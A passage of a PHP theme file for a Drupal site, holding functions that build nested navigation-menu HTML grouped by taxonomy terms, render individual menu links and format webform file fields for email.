 *   The number of children levels to display. Use -1 to display all children
 *   and use 0 to display no children.
 * @param $trail
 *   An array of parent menu items.
 */

function accretivesolutions_nice_menus_build($menu, $depth = -1, $trail = NULL) {
  if (!empty($menu)) {         
  foreach ($menu as $menu_item) {   
    $mlid = $menu_item['link']['mlid'];
    $parent_class = '';
    $class_level = 1;        
    //get first class or last class, applicable for child items
    $added_class = $menu_item['added_class'];    
    // Check to see if it is a visible menu item.
    if ($menu_item['link']['hidden'] == 0) {
      // Build class name based on menu path
      // e.g. to give each menu item individual style.
      // Strip funny symbols.
      $clean_path = str_replace(array('http://', 'www', '<', '>', '&', '=', '?', ':'), '', $menu_item['link']['href']);
      // Convert slashes to dashes.
      //set initial value for z-index
      $zindex_class ='';    
      //empty check
      if (!empty($trail)) {        
        if ($mlid==$trail[0]&&$menu_item['link']['depth']==1) {
          //set class for z-index
          $zindex_class = 'selected ';
        }
      }

      //prepare unique class for parent menus
      $menu_alias = drupal_get_path_alias($menu_item['link']['href']);
      $class = '';
      
      //set class for non parent
      $unique_class = '-'.str_replace('/','-',$menu_alias);
      if(strpos($menu_alias, "/") == 0) {
        $unique_class = $menu_alias;       
        $parent_vid = 0;
        $class_level = 0;
        $cur_page = $_SERVER['REQUEST_URI'];
        
        if ($trail && in_array($mlid, $trail)) {
          $class .= ' active-trail';
        }                
        $unique_class = str_replace(" ", "", $menu_item['link']['link_title']);

        //get nid from link_path
        $split_nid = explode("/", $menu_item['link']['link_path']);
        $node_info = node_load($split_nid[1]);
        $check_parentTaxonomy = (count($node_info->taxonomy) > 0) ? "yes" : "no";         

        if($check_parentTaxonomy == 'yes') {
          $keys = array_keys($node_info->taxonomy);
          $parent_vid = $node_info->taxonomy[$keys[0]]->vid;
        }

        //get terms for parent vocabulary
        $parent_terms = taxonomy_get_tree($parent_vid);
        $terms_container = array();
        foreach($parent_terms as $term) {
          $terms_container[$term->tid]['name'] = $term->name;
        }
      }      

      if ($menu_item['link']['depth']==3) {
        $class_level = 2;
      }

      $menu_item['link']['localized_options']['attributes']['class'] = 'level'.$class_level.$class;  
      $clean_path = str_replace('/', '-', $clean_path);
      //$class = 'menu-path-'. $clean_path;
      // If it has children build a nice little tree under it.
      if ((!empty($menu_item['link']['has_children'])) && (!empty($menu_item['below'])) && $depth != 0) {
        //get menu name
        $menu_name = $menu_item['link']['menu_name'];
        //counter check        
        if ($menu_name=='primary-links') {                            
          //initialize value
          $temp = array();
          //remove hidden links from class assignment
          foreach($menu_item['below'] as $id=>$data) {
            if ($data['link']['hidden']==0) {
              $temp[$id] = $data;
            }
          }

          //get total
          $num_total = count($temp);
          //initialize value
          $i=0;
          //finally lets set first and last class for the chosen one
          if ($num_total>1) {
            foreach($temp as $id=>$data) {
              $i++;
              if ($i==1) {
                $menu_item['below'][$id]['added_class'] = ' first';
              } elseif ($i==$num_total) {
                $menu_item['below'][$id]['added_class'] = ' last';
              }             
            }
          }
        }

        $children= '';
        $children_output = '';
        if ($menu_item['link']['link_title']!='Newsletters') {

          //reorder menus if it belongs to a taxonomy
          if($check_parentTaxonomy == 'yes') {
            $non_taxo_menus = array();
            $menu_cnt = 0;
            foreach($menu_item['below'] as $myid => $mydata) {                
              $ea_nid = explode("/", $mydata['link']['link_path']);
              $eanode_info = node_load($ea_nid[1]);               
              $eakeys = array_keys($eanode_info->taxonomy);

              if($eanode_info->taxonomy[$eakeys[0]]->vid == $parent_vid) {
                $terms_container[$eakeys[0]]['menus'][] = $mydata;
              } else {
                if($mydata['link']['hidden'] == 0)
                  $non_taxo_menus[] = $mydata;
                }
              }

              $menu_cnt = count($terms_container) + count($non_taxo_menus);
              $children_output .= '<ul class="level1">';
              $menu_ctr = 1;

              foreach($terms_container as $menu_terms) {
                $cnt_class = "";
                if($menu_ctr == 1) {
                  $cnt_class = " first";
                } elseif($menu_ctr == $menu_cnt) {
                  $cnt_class = " last";
                }

                $children_output .= "<li class=\"menuparent level1".$cnt_class."\">";                 
                $children_output .= '<ul class="level2">';                

                $child_ctr = 1;
                $child_cnt = count($menu_terms['menus']);

                foreach($menu_terms['menus'] as $term_links) {    
                  $child_class = "";
                  if($child_ctr == 1) {
                    $child_class = " first";
                  } elseif($child_ctr == $child_cnt) {
                    $child_class = " last";
                  }                    

                  $term_links['link']['localized_options']['attributes']['class'] = 'level2';  
                  $children_output .= "<li class=\"level2".$child_class."\">".theme('menu_item_link', $term_links['link'], 'nice_menus_style')."</li>";
                  $child_ctr++;
                }

                $children_output .= "</ul>\n";
                $children_output .= "<span><a href=\"javascript:;\" class=\"level1 unlink\">".$menu_terms['name']."</a></span></li>";
                $menu_ctr++;
              }            

              foreach($non_taxo_menus as $non_taxo_menu) {
                if($menu_ctr == 1) {
                  $cnt_class = " first";
                } elseif($menu_ctr == $menu_cnt) {
                  $cnt_class = " last";
                }

                $children = theme('nice_menus_build', $non_taxo_menu['below'], $depth, $trail);
                $non_taxo_menu['link']['localized_options']['attributes']['class'] = 'level1'; 
                $children_output .= "<li class=\"level1".$cnt_class."\">".theme('menu_item_link', $non_taxo_menu['link'], 'nice_menus_style')."</li>";
                $menu_ctr++;
              }

              $children_output .= "</ul>\n";                                    
              $output .= '<li id="nav'. $unique_class .'" class="'. $zindex_class . $parent_class. 'level'.$class_level.$added_class.'">'.$children_output . theme('menu_item_link', $menu_item['link'], 'nice_menus_style');                
              $output .= "</li>\n";          
            } else {          
              // Keep passing children into the function 'til we get them all.                
              $children = theme('nice_menus_build', $menu_item['below'], $depth, $trail);
              // Check our depth parameters.
              if ($menu_item['link']['depth'] <= $depth || $depth == -1) {
                // Build the child UL only if children are displayed for the user.          
                if ($children) {
                  $children_output .= '<ul class="level'.$menu_item['link']['depth'].'">';
                  $children_output .= $children;
                  $children_output .= "</ul>\n";
                }
              }
            }          
          }

          // Set the class to parent only of children are displayed.
          $parent_class = $children ? 'menuparent ' : '';
          $output .= '<li id="nav'. $unique_class .'" class="'. $zindex_class . $parent_class. 'level'.$class_level.$added_class.'">'.$children_output . theme('menu_item_link', $menu_item['link'], 'nice_menus_style');                
          $output .= "</li>\n";          
        }
        else {
          $output .= '<li id="nav'. $unique_class .'" class="'. $zindex_class .'level'. $class_level.$added_class.'">'. theme('menu_item_link', $menu_item['link'], 'nice_menus_style') .'</li>'."\n";        
        }      
      }
      $i++;
    }
  }
  return $output;
}

/**
 * Generate the HTML output for a single menu link.
 *
 * @ingroup themeable
 */
function accretivesolutions_menu_item_link($link, $style = '') {
  if (empty($link['localized_options'])) {
    $link['localized_options'] = array();
  }
  $html = (style) ? true : false;
  $link['localized_options']['html'] = $html;    
  //clear title values to remove mouseover
  $link['localized_options']['attributes']['title'] = "";
  //set initial value
  $output = l(str_replace(' & ',' &amp; ',$link['title']), $link['href'], $link['localized_options']); 
  //set titles to watch out for
  $titles = array('Business Transformation','Financial Accounting & Reporting',
                  'Information Technology Strategy','Governance & Compliance');
  //check if specified link has to be linked
  foreach($titles as $key) {
    if ($link['title']==$key&&$link['menu_name']=='primary-links') {
      //remove its link, set a custom one
      $output = '<a href="javascript:;" title="" class="'.$link['localized_options']['attributes']['class'].' unlink">'.str_replace(' & ',' &amp; ',$link['title']).'</a>';          
    }
  }
  //set span tag
  if ($link['menu_name']=='primary-links') {
    $output = '<span>'.$output.'</span>';
  }
  return  $output;
}

/**
 * Format the output of emailed data for this component
 *
 * @param mixed $data
 *   A string or array of the submitted data.
 * @param array $component
 *   An array of information describing the component, directly correlating to
 *   the webform_component database schema.
 * @return
 *   Textual output to be included in the email.
 */
function accretivesolutions_webform_mail_file($data, $component) {

  $file = is_string($data) ? unserialize($data) : $data;
  $output = $component['name'] .': '. (!empty($file['filepath']) ? '<a href="'.webform_file_url($file['filepath']).'">'.webform_file_url($file['filepath']).'</a>' : '') ."\n";
  return $output;
}
